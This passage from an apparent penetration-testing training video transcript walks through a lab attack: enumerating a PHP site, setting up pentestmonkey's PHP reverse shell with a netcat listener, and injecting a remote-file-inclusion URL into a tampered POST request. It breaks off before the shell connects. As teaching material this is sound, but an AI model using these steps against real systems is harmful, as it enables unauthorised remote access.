them.\n\n191\n00:10:14.620 --> 00:10:19.020\nAnd I'll make a drop really easy and\nthen, of course, we rehearse shells.\n\n192\n00:10:19.020 --> 00:10:22.710\nI've been hammering the whole\narm to revert shell.\n\n193\n00:10:22.710 --> 00:10:26.180\nI want them to pump\nback to me as shell but\n\n194\n00:10:26.180 --> 00:10:29.950\nyou might not be the greatest\nshell coach out there.\n\n195\n00:10:29.950 --> 00:10:30.740\nGuilty.\n\n196\n00:10:30.740 --> 00:10:34.460\nGuilty as charge, right,\nit's not the shame that is at all.\n\n197\n00:10:34.460 --> 00:10:35.860\nIt's not a bad thing.\n\n198\n00:10:35.860 --> 00:10:40.140\nFortunately, there are those great\nindividuals out there that realize that\n\n199\n00:10:40.140 --> 00:10:44.950\nnot everyone has their skills, so with\ngreat power comes great responsibility,\n\n200\n00:10:44.950 --> 00:10:46.305\nand they help us out with that.\n\n201\n00:10:46.305 --> 00:10:49.880\nOnsite, I'm gonna definitely recommend,\nlet's just jump to that really quickly so\n\n202\n00:10:49.880 --> 00:10:51.310\nyou can see it.\n\n203\n00:10:51.310 --> 00:10:53.140\nLet me open my Firefox browser.\n\n204\n00:10:54.450 --> 00:10:56.360\nAnd just do a Google search for.\n\n205\n00:10:56.360 --> 00:10:58.261\nActually, I'll just go to it.\n\n206\n00:10:58.261 --> 00:11:06.138\nIt's http://pentestmonkey.net [LAUGH].\n\n207\n00:11:06.138 --> 00:11:07.880\nYeah, great site.\n\n208\n00:11:07.880 --> 00:11:09.800\nLots of great information here.\n\n209\n00:11:09.800 --> 00:11:12.941\nLots of great scripts and tools and things\nthat he's made available or this person.\n\n210\n00:11:12.941 --> 00:11:18.131\nI don't know if it's a he or she or\na group of individuals that have put\n\n211\n00:11:18.131 --> 00:11:23.769\na great set of tools for you as a pen\ntester to take advantage of great stuff,\n\n212\n00:11:23.769 --> 00:11:28.712\ncheat sheets, shells,\nobviously,webshells,great stuff.\n\n213\n00:11:28.712 --> 00:11:33.627\nThe URL specifically we need\nto get to because I don't know\n\n214\n00:11:33.627 --> 00:11:37.439\nhow to navigate their without a URL,\ntools,\n\n215\n00:11:37.439 --> 00:11:41.896\nweb shells, dash shells-php-reverse-shell.\n\n216\n00:11:41.896 --> 00:11:44.870\nI think that's it.\n\n217\n00:11:44.870 --> 00:11:46.010\nYeah.\nThere we go.\n\n218\n00:11:46.010 --> 00:11:48.960\nThis is something you're\ngoing to want to download and\n\n219\n00:11:48.960 --> 00:11:51.910\nput into the web rot of your Apache or\n\n220\n00:11:51.910 --> 00:11:56.160\nin Jinx or wherever it is Web server,\nwhatever web server you're running,\n\n221\n00:11:56.160 --> 00:11:59.755\nput it in the web root there, cuz we're\ngonna be serving this up hot on a plate.\n\n222\n00:11:59.755 --> 00:12:00.390\n&gt;&gt; [LAUGH]\n&gt;&gt; And\n\n223\n00:12:00.390 --> 00:12:01.710\nthat's what's gonna give us our web shell.\n\n224\n00:12:01.710 --> 00:12:04.570\nWe do need to modify\nthis code just a tad so\n\n225\n00:12:04.570 --> 00:12:07.230\nthat it will fit our function,\nas we need it to.\n\n226\n00:12:07.230 --> 00:12:09.870\nBut that should be pretty easy.\n\n227\n00:12:09.870 --> 00:12:11.510\nJust grab that TAR and download it.\n\n228\n00:12:13.270 --> 00:12:15.190\nAnd obviously, there's a walk through.\n\n229\n00:12:15.190 --> 00:12:16.210\nThank you so much guys.\n\n230\n00:12:16.210 --> 00:12:20.440\nI'm showing you exactly how to\nmodify the code if you need to and\n\n231\n00:12:20.440 --> 00:12:21.520\neven catch the reverse shell.\n\n232\n00:12:21.520 --> 00:12:25.700\nLook at it man, they've made it all one\nstop shopping right here at pentestmonkey.\n\n233\n00:12:25.700 --> 00:12:26.350\nTotally, love them.\n\n234\n00:12:26.350 --> 00:12:28.440\nSo grab that cuz we're gonna need it,\n\n235\n00:12:28.440 --> 00:12:32.350\nwe're gonna need it not in just\nthis episode, but in more beyond.\n\n236\n00:12:32.350 --> 00:12:34.060\nSo once you do that, like I said,\n\n237\n00:12:34.060 --> 00:12:37.700\nsave it to your web root,\nwe're going to play around with it.\n\n238\n00:12:37.700 --> 00:12:38.440\nWhere are we?\n\n239\n00:12:39.460 --> 00:12:42.310\nNow, we get to start our attack.\n\n240\n00:12:42.310 --> 00:12:43.990\nWe've run nit kill already.\n\n241\n00:12:43.990 --> 00:12:48.570\nWe found that RFI might be one of our\nattack vectors so we want to do that.\n\n242\n00:12:48.570 --> 00:12:52.340\nWe know it's obviously running PHP and\n\n243\n00:12:52.340 --> 00:12:55.480\nwe know it's running a web\nserver with PHP code.\n\n244\n00:12:55.480 --> 00:12:56.970\nSo let's go to our browser.\n\n245\n00:12:56.970 --> 00:12:59.950\nMan, all those browser hacking so much fun\n&gt;&gt; [LAUGH]\n\n246\n00:12:59.950 --> 00:13:01.520\n&gt;&gt; I love the fact that everybody and\n\n247\n00:13:01.520 --> 00:13:03.360\ntheir brother has a browser.\n\n248\n00:13:03.360 --> 00:13:05.010\n&gt;&gt; Yes.\n&gt;&gt; And so that means anybody and\n\n249\n00:13:05.010 --> 00:13:08.490\ntheir brother can hack.\n\n250\n00:13:08.490 --> 00:13:09.930\nIt's fun, it's a good time.\n\n251\n00:13:09.930 --> 00:13:15.130\nLet's go to our site, it was 156 if I'm\nnot mistaken, so 192.168.219.156, Return.\n\n252\n00:13:15.130 --> 00:13:16.440\nYep, there's good old Milnet.\n\n253\n00:13:17.650 --> 00:13:21.930\nArmy material command Seckenheim,\nDeutschland.\n\n254\n00:13:21.930 --> 00:13:25.510\nApparently, it's some German\nmilitary organization.\n\n255\n00:13:25.510 --> 00:13:27.517\nWe're going for\nthe big boys here, look at us.\n\n256\n00:13:27.517 --> 00:13:28.730\n&gt;&gt; [LAUGH]\n&gt;&gt; We're going crazy,\n\n257\n00:13:28.730 --> 00:13:34.100\nwe got a couple of buttons over here,\na Main, Bombay, and Props.\n\n258\n00:13:34.100 --> 00:13:37.840\nI think actually these\nare all the same link\n\n259\n00:13:37.840 --> 00:13:40.360\neven though you'll notice\nas I hover over them.\n\n260\n00:13:40.360 --> 00:13:42.890\nTypically, if you hover over a link,\nit'll tell you where that link goes to.\n\n261\n00:13:42.890 --> 00:13:44.260\nWe're not seeing any of that here.\n\n262\n00:13:46.830 --> 00:13:50.210\nBut if we go back to our\nNikto scan right here,\n\n263\n00:13:50.210 --> 00:13:54.460\nit gave us this info.php information.\n\n264\n00:13:54.460 --> 00:13:58.480\nNow, what that's telling\nus is that is a web\n\n265\n00:13:58.480 --> 00:14:03.330\ndirectory that it was able to a find and\neven go into and\n\n266\n00:14:03.330 --> 00:14:06.120\nyou might want to check it out there\nmight be interesting information there.\n\n267\n00:14:06.120 --> 00:14:06.710\nSo let's do that.\n\n268\n00:14:06.710 --> 00:14:10.376\nAll you have to do is add\nthat to your thing here.\n\n269\n00:14:10.376 --> 00:14:16.750\nSo info.php hit return and\nlook at that, it tells me,\n\n270\n00:14:16.750 --> 00:14:22.470\nPHP version 7.0.4-7 Ubuntu 2,\ngetting great info from the system.\n\n271\n00:14:22.470 --> 00:14:26.450\nRemember, that enumeration process\nis key gathering information.\n\n272\n00:14:26.450 --> 00:14:27.140\nYou gotta do that.\n\n273\n00:14:28.310 --> 00:14:32.250\nIf I scroll down,\nI just keep scrolling through here.\n\n274\n00:14:32.250 --> 00:14:39.859\nI'm gonna see some interesting\nstuff like right round this region.\n\n275\n00:14:41.190 --> 00:14:41.690\nLook at that.\n\n276\n00:14:43.060 --> 00:14:46.740\nSo, remember,\nwe said allow URLF Open Equals on.\n\n277\n00:14:46.740 --> 00:14:49.590\nIt's letting me know\nURLF open does equal on.\n\n278\n00:14:49.590 --> 00:14:51.730\nSo does allow URL underscore include.\n\n279\n00:14:52.790 --> 00:14:55.560\nIncludes are allowed, so\nwe might have includes in here.\n\n280\n00:14:55.560 --> 00:14:57.490\nThat's why Nick was telling us, hey,\n\n281\n00:14:57.490 --> 00:14:59.810\nRFI might be a thing that\nyou want to look into.\n\n282\n00:14:59.810 --> 00:15:00.650\nAll right.\nSo that's good.\n\n283\n00:15:00.650 --> 00:15:05.710\nWe know that at least it's capable of\ndoing it, but are we capable of doing it?\n\n284\n00:15:05.710 --> 00:15:06.250\nIt says create info.\n\n285\n00:15:06.250 --> 00:15:13.700\nSo we go browsing back to the main\npage here and let's see here.\n\n286\n00:15:13.700 --> 00:15:14.980\nOne of the things you definitely wanna do,\n\n287\n00:15:14.980 --> 00:15:18.280\none you definitely when you're working\nwith websites, look at the source code.\n\n288\n00:15:18.280 --> 00:15:21.270\nYou never know what kind of good\ninformation might be gleaned\n\n289\n00:15:21.270 --> 00:15:22.920\nby just looking at the source code.\n\n290\n00:15:22.920 --> 00:15:27.400\nSo I'll just right click View page source.\n\n291\n00:15:27.400 --> 00:15:31.390\nThere you go.\nI've get a couple of web links here.\n\n292\n00:15:31.390 --> 00:15:34.040\nFrame source equals nab dot PHP.\n\n293\n00:15:34.040 --> 00:15:39.070\nThere's a nab.PHP and a main.PHP link.\n\n294\n00:15:39.070 --> 00:15:42.000\nThose are pages that I can browse to.\n\n295\n00:15:42.000 --> 00:15:47.877\nAll I have to do is go up into\nthe browser and say /nav.php.\n\n296\n00:15:47.877 --> 00:15:50.160\nLike that.\n\n297\n00:15:50.160 --> 00:15:51.050\nOkay.\nSo that's that\n\n298\n00:15:51.050 --> 00:15:53.850\nframe over there on the left\nside is the nav.php link.\n\n299\n00:15:53.850 --> 00:15:54.711\nThat's where it takes you.\n\n300\n00:15:54.711 --> 00:15:58.024\nSo this is a framed website using frames.\n\n301\n00:15:58.024 --> 00:16:00.458\nAnd the other was main.php.\n\n302\n00:16:00.458 --> 00:16:02.010\nSo let's just see what that does.\n\n303\n00:16:05.104 --> 00:16:09.250\nThere we go, so that's the two\nsides of the coin right there.\n\n304\n00:16:09.250 --> 00:16:12.480\nNot a whole lot going on though,\nnothing crazy here.\n\n305\n00:16:14.400 --> 00:16:20.210\nLet's view the source on the main page,\nlet's see, View page source.\n\n306\n00:16:20.210 --> 00:16:24.283\nOkay, there is nothing,\nit does have this image,\n\n307\n00:16:24.283 --> 00:16:29.413\nalign center but not a lot of context,\nnot a lot of information.\n\n308\n00:16:29.413 --> 00:16:33.880\nSo this is really kinda letting us\ndown as far as the information goes.\n\n309\n00:16:35.310 --> 00:16:39.287\nLet's go back to that ,let's view\nthat nav, see what that gives us.\n\n310\n00:16:41.248 --> 00:16:44.050\nOkay, little more information here.\n\n311\n00:16:44.050 --> 00:16:46.010\nSee we've, this is good.\n\n312\n00:16:46.010 --> 00:16:47.964\nSo, we've got this right here,\nthis form method=post.\n\n313\n00:16:47.964 --> 00:16:52.127\nSo this is post data, we're actually\ngiving it some instructions,\n\n314\n00:16:52.127 --> 00:16:53.790\nwhich is a button, right?\n\n315\n00:16:53.790 --> 00:16:57.160\nSo you click a button,\nit's saying this button does this.\n\n316\n00:16:57.160 --> 00:17:00.416\nThe action is take me to content.php.\n\n317\n00:17:00.416 --> 00:17:05.220\nThe value=main, so\nthat's why it says main on that button.\n\n318\n00:17:05.220 --> 00:17:07.510\nThere's bomb and props.\n\n319\n00:17:07.510 --> 00:17:12.235\nSo they all take me to content.php,\nthat's good information to know.\n\n320\n00:17:12.235 --> 00:17:15.100\nContent.php is obviously a page.\n\n321\n00:17:15.100 --> 00:17:17.698\nI wonder what the heck is on content.php?\n\n322\n00:17:17.698 --> 00:17:19.785\n&gt;&gt; Well, let's find out.\n\n323\n00:17:19.785 --> 00:17:23.849\n&gt;&gt; Yeah, let's do that very thing.\n\n324\n00:17:23.849 --> 00:17:31.630\nLet's see here, let's go to content.php,\nit's the same thing, just like main.\n\n325\n00:17:31.630 --> 00:17:34.140\nSo, it's basically\na copy of the main page.\n\n326\n00:17:34.140 --> 00:17:37.200\nOr maybe an alias or\nsomething of that fact.\n\n327\n00:17:37.200 --> 00:17:38.360\nAll right, go back here.\n\n328\n00:17:38.360 --> 00:17:41.040\nI do like knowing that is there, so\nwe've got content, we've got main,\n\n329\n00:17:41.040 --> 00:17:45.894\nwe've got nav.php and info.php.\n\n330\n00:17:45.894 --> 00:17:47.820\nSo let's see here, what else do we got?\n\n331\n00:17:47.820 --> 00:17:49.303\nWhat do we wanna do next here?\n\n332\n00:17:50.898 --> 00:17:55.090\nLet's do some source code peeping.\n\n333\n00:17:55.090 --> 00:17:59.700\nSo we can use a command line tool\ncalled cURL, to see if there's\n\n334\n00:17:59.700 --> 00:18:03.575\nmaybe almost something extra we are not\nseeing in the graphical representation,\n\n335\n00:18:03.575 --> 00:18:05.490\nright, that could be a problem.\n\n336\n00:18:05.490 --> 00:18:06.483\nSo let's just use our command line tool.\n\n337\n00:18:06.483 --> 00:18:11.458\nLets say, curl -v and you say,\n\n338\n00:18:11.458 --> 00:18:19.210\nhttp://192.168.219.156.\n\n339\n00:18:19.210 --> 00:18:22.548\nAnd then,\nwe'll do nav because that one had so\n\n340\n00:18:22.548 --> 00:18:26.924\nmuch good information there,\nlet's see what's going on.\n\n341\n00:18:26.924 --> 00:18:30.719\nAnd it looks like curl done premature,\n\n342\n00:18:30.719 --> 00:18:35.319\nI think there's any\ndifference going on here,\n\n343\n00:18:35.319 --> 00:18:39.689\nI can move this over make\na lot easier to view,\n\n344\n00:18:39.689 --> 00:18:43.050\nyeah, so that's content.php.\n\n345\n00:18:43.050 --> 00:18:44.930\nBut that's interesting to me.\n\n346\n00:18:44.930 --> 00:18:46.420\nIt keeps taking me to the same page,\n\n347\n00:18:46.420 --> 00:18:50.220\nthat page is a very important\napparently to this site.\n\n348\n00:18:50.220 --> 00:18:51.700\nSo, I wanna keep that\non the back of my head.\n\n349\n00:18:51.700 --> 00:18:54.820\nAnd the fact that it's doing post\ncommands, that's also very good.\n\n350\n00:18:54.820 --> 00:19:00.500\nIt's posting to that page via that\nnav.php buttons, that's a good stuff.\n\n351\n00:19:01.810 --> 00:19:04.420\nSo let's do this, let's go ahead and,\nI remember I talked about\n\n352\n00:19:04.420 --> 00:19:08.650\nthe php-reverse-shell that we\ndownloaded from pentestmonkey,\n\n353\n00:19:08.650 --> 00:19:12.440\nlet's go ahead and get that ready,\nbecause I think I found my attack vector.\n\n354\n00:19:12.440 --> 00:19:17.940\nThat post is letting me think\nthat's where we're going to\n\n355\n00:19:17.940 --> 00:19:22.490\nfire off this attack, cuz I'm gonna\ntry to inject into that post data.\n\n356\n00:19:23.910 --> 00:19:28.430\nSo let's do that, let's, I know I have,\nlet me see if I kept it here, nope.\n\n357\n00:19:28.430 --> 00:19:31.490\nI'll go to, where is it?\n\n358\n00:19:31.490 --> 00:19:33.630\nIt's in my web root, [LAUGH].\n\n359\n00:19:33.630 --> 00:19:38.814\nSo let's see here, cd /var,\ncuz I'm running Apache,\n\n360\n00:19:38.814 --> 00:19:43.890\nvar/www/html, ls, I know,\nI think I called it php.\n\n361\n00:19:43.890 --> 00:19:49.687\nI think it left it the same name,\nphpshell, phpshell.\n\n362\n00:19:49.687 --> 00:19:53.204\nI also have it saved as php-reverse-shell,\nphpshell,\n\n363\n00:19:53.204 --> 00:19:55.825\napparently, I play with this a few times.\n\n364\n00:19:55.825 --> 00:19:57.370\n&gt;&gt; [LAUGH]\n&gt;&gt; Once or twice, just a hare,\n\n365\n00:19:57.370 --> 00:19:58.020\njust a hare.\n\n366\n00:19:59.030 --> 00:20:06.040\nLet's take a look inside of it so,\ncat phpshell.php.\n\n367\n00:20:06.040 --> 00:20:10.100\nAnd what's interesting about this,\ndo this for\n\n368\n00:20:10.100 --> 00:20:15.030\nyou guys, let's go up to the top here,\nit's very easy to modify to\n\n369\n00:20:15.030 --> 00:20:19.340\nget it to do what you want it to do, cuz\nthere's only a few things you have to do.\n\n370\n00:20:19.340 --> 00:20:23.285\nChange this and change this,\nwhat IP does it need to try to contact and\n\n371\n00:20:23.285 --> 00:20:25.406\nat what port does it need to contact.\n\n372\n00:20:25.406 --> 00:20:29.420\nYou know me, I like 9999,\nso that's what I put there.\n\n373\n00:20:29.420 --> 00:20:34.249\nThis is the IP of my Kali box, so\nthat's where I'm going to be listening.\n\n374\n00:20:34.249 --> 00:20:40.330\nSo, change your PHP shell as necessary for\nyour environment.\n\n375\n00:20:40.330 --> 00:20:43.990\nAnd that's basically it for this,\nwe don't have to do anything else.\n\n376\n00:20:43.990 --> 00:20:46.410\nLet's see, now that we have that,\n\n377\n00:20:46.410 --> 00:20:49.060\nI'm following my notes here because\nit's easy to forget a skip.\n\n378\n00:20:49.060 --> 00:20:52.120\nAnd I just want to guide you guys\nthrough this very easily and quickly.\n\n379\n00:20:53.843 --> 00:20:55.670\nWe got PHP, we're putting it there.\n\n380\n00:20:55.670 --> 00:21:00.390\nMake sure that your Apache service is\nstarted, that's always a good idea.\n\n381\n00:21:00.390 --> 00:21:06.290\nYou can do that with\nservice apache2 restart,\n\n382\n00:21:06.290 --> 00:21:09.810\nthat just verifies that it started right,\nthat it came through, no errors.\n\n383\n00:21:11.520 --> 00:21:12.841\nWhat else do we need to do?\n\n384\n00:21:12.841 --> 00:21:15.430\nWe need to, works with our environment,\nwe're good with that.\n\n385\n00:21:15.430 --> 00:21:17.060\nWe started a net cat listener,\nlet's go ahead and\n\n386\n00:21:17.060 --> 00:21:19.540\ndo that cuz it can be sitting\naround waiting for us.\n\n387\n00:21:19.540 --> 00:21:25.410\nnc -nvlp and on port 9999, Enter.\n\n388\n00:21:25.410 --> 00:21:33.860\nI am going to now reduce this in size back\ndown to kinda where it was, there we go.\n\n389\n00:21:33.860 --> 00:21:35.910\nAll right, so let's go ahead and\n\n390\n00:21:35.910 --> 00:21:41.100\nlet's start playing around with\nour tampered data, let's do that.\n\n391\n00:21:41.100 --> 00:21:44.830\nSo if you got that guide installed,\ngo ahead and fire up,\n\n392\n00:21:44.830 --> 00:21:48.420\nTools and it should be right there,\nminus this tampered data and\n\n393\n00:21:48.420 --> 00:21:52.810\nit gives us this option,\nbasically to start tampering.\n\n394\n00:21:52.810 --> 00:21:57.160\nSo what this is gonna do is it's gonna\nintercept any requests we make to\n\n395\n00:21:57.160 --> 00:22:02.320\na website allowing us to modify them\nbefore it actually sends them off.\n\n396\n00:22:02.320 --> 00:22:03.105\n&gt;&gt; That's a beautiful thing.\n\n397\n00:22:03.105 --> 00:22:04.320\n&gt;&gt; It is a beautiful thing and\n\n398\n00:22:04.320 --> 00:22:07.070\nit seems like, well,\nwhat's the big deal about that?\n\n399\n00:22:07.070 --> 00:22:10.350\nBecause websites typically\ndon't allow you to modify\n\n400\n00:22:10.350 --> 00:22:13.810\nthings after you've hit the send button or\nsubmit button or whatever.\n\n401\n00:22:13.810 --> 00:22:15.630\nThis is allowing us to do this,\nintercepting it,\n\n402\n00:22:15.630 --> 00:22:20.810\nbasically acting as a proxy, to go through\nthem so that we can see all that and\n\n403\n00:22:20.810 --> 00:22:25.260\nthen change any information to our liking\nbefore it actually hits the web server.\n\n404\n00:22:25.260 --> 00:22:26.250\nSo this is a very powerful tool.\n\n405\n00:22:26.250 --> 00:22:30.120\n&gt;&gt; Absolutely, if you think about what's\nactually happening there, any processing\n\n406\n00:22:30.120 --> 00:22:36.040\nthat was done on the browser side,\nany of those client-side checks,\n\n407\n00:22:36.040 --> 00:22:40.380\ninput validation or sanitization, things\nlike that, all that's already happened.\n\n408\n00:22:40.380 --> 00:22:44.860\nNow, the packet's been formulated and it's\nbeing sent, and now we're modifying it.\n\n409\n00:22:44.860 --> 00:22:49.930\nSo, if there aren't any, sometimes these\nadmins will not that they get lazy,\n\n410\n00:22:49.930 --> 00:22:53.090\nbut it's like, all right, we've already\ndone our checks on the client-side,\n\n411\n00:22:53.090 --> 00:22:56.130\nwhy do I need to do checks again\non the server-side, right?\n\n412\n00:22:56.130 --> 00:22:57.240\nSo, they maybe don't do that.\n\n413\n00:22:57.240 --> 00:22:59.506\nAnd we're getting to modify that\ndata before it hits the server.\n\n414\n00:22:59.506 --> 00:23:02.237\nAnd if you find a web\nserver that supports post,\n\n415\n00:23:02.237 --> 00:23:06.267\nwhich is basically a web server that\nsays hey, you must accept data and\n\n416\n00:23:06.267 --> 00:23:10.300\nstore data that's found in these packets,\nwe're off to the races.\n\n417\n00:23:10.300 --> 00:23:11.720\n&gt;&gt; Yes, exactly right.\n\n418\n00:23:11.720 --> 00:23:13.600\nSo, let's see what that looks like.\n\n419\n00:23:13.600 --> 00:23:14.840\nThis will be a lot of fun.\n\n420\n00:23:14.840 --> 00:23:16.169\nSo, we are tampering with our data.\n\n421\n00:23:16.169 --> 00:23:19.662\nWe're just gonna go ahead and\nshrink this out of the way very quickly.\n\n422\n00:23:19.662 --> 00:23:25.380\nI wanna go back to that main page here,\njust the actual initial page that we get.\n\n423\n00:23:28.910 --> 00:23:30.010\nI'll Submit this.\n\n424\n00:23:30.010 --> 00:23:34.000\nYou're starting to see that tampered data\nis intercepting everything that I'm doing\n\n425\n00:23:34.000 --> 00:23:38.120\nas far as my website goes now or\nmy web use should I say.\n\n426\n00:23:39.230 --> 00:23:40.670\nRight now,\nI just wanna go to the web page so\n\n427\n00:23:40.670 --> 00:23:43.180\nI'm just letting it submit I'm\nnot actually tampering with it.\n\n428\n00:23:43.180 --> 00:23:47.880\nYou're starting to see it log\nevery submission though, right?\n\n429\n00:23:47.880 --> 00:23:48.780\nSo, just keep that in mind.\n\n430\n00:23:48.780 --> 00:23:50.451\nGet this out of the way.\n\n431\n00:23:50.451 --> 00:23:52.860\nThis is where I wanna go,\nI'm gonna click on this.\n\n432\n00:23:52.860 --> 00:23:59.973\nAnd notice it's taking me to\ncontent.php cuz remember,\n\n433\n00:23:59.973 --> 00:24:06.950\nwhen we looked at that nav So\nI'm gonna tamper with that.\n\n434\n00:24:08.270 --> 00:24:09.380\nAnd here we go.\n\n435\n00:24:09.380 --> 00:24:11.860\nSo now over here is our post value.\n\n436\n00:24:11.860 --> 00:24:15.173\nSee, post parameter value as\nthis route value and then main.\n\n437\n00:24:15.173 --> 00:24:18.996\nWell, guess what, instead of main,\nlet's take a look and\n\n438\n00:24:18.996 --> 00:24:23.610\nlet's point it toward my server\nwhere that reverse PHP show is.\n\n439\n00:24:23.610 --> 00:24:24.670\nHow about that?\n\n440\n00:24:24.670 --> 00:24:31.927\nSo we'll say, http://192.168.219.146 and\n\n441\n00:24:31.927 --> 00:24:35.042\nwe'll say phpshell.php.\n\n442\n00:24:35.042 --> 00:24:38.470\nAnd then we'll hit OK.\n\n443\n00:24:40.100 --> 00:24:43.830\nNow let's take a look at our shell.\n\n444\n00:24:43.830 --> 00:24:45.670\nEverything went through.\n\n445\n00:24:45.670 --> 00:24:46.750\nShrink it down.\n\n446\n00:24:46.750 --> 00:24:48.130\nLook at that.\n\n447\n00:24:48.130 --> 00:24:49.796\nNo shell.\nHm, so that means there's\n\n448\n00:24:49.796 --> 00:24:51.350\na problem, right?\n\n449\n00:24:51.350 --> 00:24:55.410\nSo there's either a problem of\nthis post isn't really working or\n\n450\n00:24:55.410 --> 00:24:56.800\nI've got a problem maybe with Apache.\n\n451\n00:24:56.800 --> 00:25:00.386\nLet's check the Apache logs and\nsee if it actually made a connection.\n\n452\n00:25:00.386 --> 00:25:04.880\nSo I'll cat/var/logs\n\n453\n00:25:04.880 --> 00:25:09.374\nwritelog/apache2 and\n\n454\n00:25:09.374 --> 00:25:13.020\nthen access.log.\n\n455\n00:25:13.020 --> 00:25:19.540\nWell, there's the last log right\nthere saying, that's interesting.\n\n456\n00:25:19.540 --> 00:25:20.300\nI do.\n\n457\n00:25:20.300 --> 00:25:22.448\nIf you're looking at the screen\nhopefully it's caught your eyes,\n\n458\n00:25:22.448 --> 00:25:23.437\nsee it's caught Mike's eye.\n\n459\n00:25:23.437 --> 00:25:26.410\nMike, why don't you go ahead and tell\nthe good people what the problem is here.\n\n460\n00:25:26.410 --> 00:25:29.630\n&gt;&gt; Well, it does look like\nthe file extension on that is\n\n461\n00:25:29.630 --> 00:25:30.616\nbeen doubled up\n&gt;&gt; It does.\n\n462\n00:25:30.616 --> 00:25:35.478\n&gt;&gt; You see a .php.php, so somewhere I\nbet you it's trying to add that on for\n\n463\n00:25:35.478 --> 00:25:39.330\nyou, so maybe we didn't need\nto put it in the first place.\n\n464\n00:25:39.330 --> 00:25:41.600\n&gt;&gt; That's the problem,\nat least one of the problems, right?\n\n465\n00:25:41.600 --> 00:25:44.090\nWe know that that is\ndefinitely causing an issue.\n\n466\n00:25:44.090 --> 00:25:47.885\nThe file is not called phpshell.php.php,\n\n467\n00:25:47.885 --> 00:25:52.605\nit's called shell.php,\nso we need to remove\n\n468\n00:25:52.605 --> 00:25:57.450\n.php off of our, so that's why you\nsaw the multiple ones in here.\n\n469\n00:25:57.450 --> 00:26:03.640\nBasically what I did was just copy our php\nfile and just remove the .php on the end.\n\n470\n00:26:03.640 --> 00:26:09.080\nSo when it goes through our post data,\nit adds .php for us.\n\n471\n00:26:09.080 --> 00:26:13.610\nThis is a technique that web\ndevelopers used to make sure that\n\n472\n00:26:13.610 --> 00:26:15.500\nwhat you're sending\nthem is what should be.\n\n473\n00:26:15.500 --> 00:26:17.240\nIt's a validation type of thing.\n\n474\n00:26:17.240 --> 00:26:18.780\nSo we're gonna get around\nthat just by removing .php.\n\n475\n00:26:18.780 --> 00:26:20.390\nSo let's do that.\n\n476\n00:26:20.390 --> 00:26:21.824\nLet's go back to Tamper Data.\n\n477\n00:26:21.824 --> 00:26:25.372\nDuck\\g a\\g duck\\g a\\g, don't need that.\n\n478\n00:26:25.372 --> 00:26:29.345\nLet me, where is,\nit's showing up as Iceweasel.\n\n479\n00:26:29.345 --> 00:26:29.903\nThere we go.\n\n480\n00:26:29.903 --> 00:26:31.860\nLet's click it again.\n\n481\n00:26:33.210 --> 00:26:37.240\nThis time we'll hit tamper again and\n\n482\n00:26:37.240 --> 00:26:42.702\nhttp://192.168.219.146.\n\n483\n00:26:42.702 --> 00:26:49.520\nAnd this time,\nwe'll just say php shell, no .php.\n\n484\n00:26:49.520 --> 00:26:51.270\nAnd that does actually exist.\n\n485\n00:26:51.270 --> 00:26:53.590\nIt's in my web route, okay.\n\n486\n00:26:54.910 --> 00:27:00.790\nGo in, see that it went through,\nstill no show.\n\n487\n00:27:00.790 --> 00:27:02.650\nSo what the heck is going on?\n\n488\n00:27:02.650 --> 00:27:06.743\nThe problem is there's something in the\nconfiguration of my Apache server because\n\n489\n00:27:06.743 --> 00:27:09.442\nif we take a look,\nwe do the var.log and access again.\n\n490\n00:27:09.442 --> 00:27:13.050\nYou'll notice that the request\nwent through correctly this time.\n\n491\n00:27:13.050 --> 00:27:13.870\n&gt;&gt; That looks better.\n\n492\n00:27:13.870 --> 00:27:16.870\n&gt;&gt; But Apache didn't serve it up.\n\n493\n00:27:16.870 --> 00:27:17.970\nOkay, that's the problem.\n\n494\n00:27:17.970 --> 00:27:19.600\nSo it's just a configuration\nproblem in my Apache,\n\n495\n00:27:19.600 --> 00:27:21.220\nI'd have to go back in and fix this.\n\n496\n00:27:21.220 --> 00:27:24.180\nI left it purposely, so\nI can show you an easy way if\n\n497\n00:27:24.180 --> 00:27:28.050\nyou don't wanna install Apache as well,\ninstall another web browser.\n\n498\n00:27:28.050 --> 00:27:29.450\nI'm sorry, web server.\n\n499\n00:27:30.490 --> 00:27:33.000\nYou can fire one up with Python very easy,\n\n500\n00:27:33.000 --> 00:27:36.650\na little one liner and\nget a web server going.\n\n501\n00:27:36.650 --> 00:27:42.580\nSo let me show you how to do that,\nI'm going to copy cuz whatever directory\n\n502\n00:27:42.580 --> 00:27:46.770\nyou're in is the one that it's gonna pull\nfrom, it's gonna act as the web route.\n\n503\n00:27:46.770 --> 00:27:49.800\nSo wherever you fire\nthis Python script up at,\n\n504\n00:27:49.800 --> 00:27:53.330\nit's gonna see that working\ndirectory as your web route.\n\n505\n00:27:53.330 --> 00:27:56.570\nSo I'm gonna copy my PHP Shell\ninto this directory.\n\n506\n00:27:56.570 --> 00:28:02.461\nSo copy /var/www/html phpshell to here,\n\n507\n00:28:02.461 --> 00:28:06.030\nI'm gonna copy phpshell.\n\n508\n00:28:08.390 --> 00:28:14.268\nSo now in LS, there's my phpshell and\nall I have to do is say\n\n509\n00:28:14.268 --> 00:28:19.650\npython-m simple http server,\n\n510\n00:28:19.650 --> 00:28:22.930\nlike that, and then give it a port\nnumber that you want it to reside on.\n\n511\n00:28:22.930 --> 00:28:24.776\nI'll say 8888, like that.\n\n512\n00:28:24.776 --> 00:28:32.270\nAnd now I'm serving HTTP on port 8888\nwith a simple one liner from Python.\n\n513\n00:28:32.270 --> 00:28:33.240\nLet's try this yet\n\n514\n00:28:33.240 --> 00:28:38.790\none more time and see if things don't\nwork a little more according to our plan.\n\n515\n00:28:39.930 --> 00:28:44.020\nWhere is [INAUDIBLE],\nit looks to give me tampered data first.\n\n516\n00:28:44.020 --> 00:28:49.385\nAll right,\nit's tampered with it lets tell it\n\n517\n00:28:49.385 --> 00:28:55.306\nhttp://192.168.219.146 and\n\n518\n00:28:55.306 --> 00:28:59.570\nthis time, it is on port 8888 and\n\n519\n00:28:59.570 --> 00:29:03.300\n/phpshell like that, hit OK.\n\n520\n00:29:03.300 --> 00:29:05.990\nAll right, fingers crossed ladies and\ngentlemen,\n\n521\n00:29:05.990 --> 00:29:08.620\nhopefully we actually got\nsome action this time.\n\n522\n00:29:08.620 --> 00:29:13.970\n[SOUND] Well, it did,\nactually they got the Git requests and\n\n523\n00:29:13.970 --> 00:29:17.508\nI tried it, but it didn't fire it off.\n\n524\n00:29:17.508 --> 00:29:21.660\nSo we got to better take\na look at some things.\n\n525\n00:29:21.660 --> 00:29:24.920\nOkay, so because hacking is an art and\n\n526\n00:29:24.920 --> 00:29:29.340\nnot just a skill, there are things 